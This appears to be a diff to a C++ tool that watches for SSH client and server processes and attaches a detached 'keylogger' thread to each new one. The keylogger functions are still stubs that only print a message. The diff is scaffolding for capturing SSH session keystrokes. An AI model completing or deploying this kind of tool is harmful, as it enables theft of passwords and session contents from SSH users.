@@ -83,6 +83,16 @@ std::vector<Process> get_proc_list_of_ssh(){
     return proc_list;
 }
 
+void ssh_keylogger(const uint16_t& pid){
+    // TODO: parser
+    std::cout << "Handling process(outgoing SSH) " << pid << " by keylogger" << std::endl;
+}
+
+void sshd_keylogger(const uint16_t& pid){
+    // TODO: parser
+    std::cout << "Handling process(incoming SSH) " << pid << " by keylogger" << std::endl;
+}
+
 void check_ps(std::vector<uint16_t>& procs_in_monitoring){
     std::vector<Process> proc_list = get_proc_list_of_ssh();
     for (auto &proc : proc_list){
@@ -90,14 +100,18 @@ void check_ps(std::vector<uint16_t>& procs_in_monitoring){
             auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
             if(it == procs_in_monitoring.end()){
                 procs_in_monitoring.emplace_back(proc.get_pid());
-                // TODO: Async parser
+                // TODO: parser
+                std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
+                sshd_keylog.detach();
             }
         }
         else if(proc.find_ssh()){
             auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
             if(it == procs_in_monitoring.end()){
                 procs_in_monitoring.emplace_back(proc.get_pid());
-                // TODO: Async parser
+                // TODO: parser
+                std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
+                ssh_keylog.detach();
             }
         }
     }
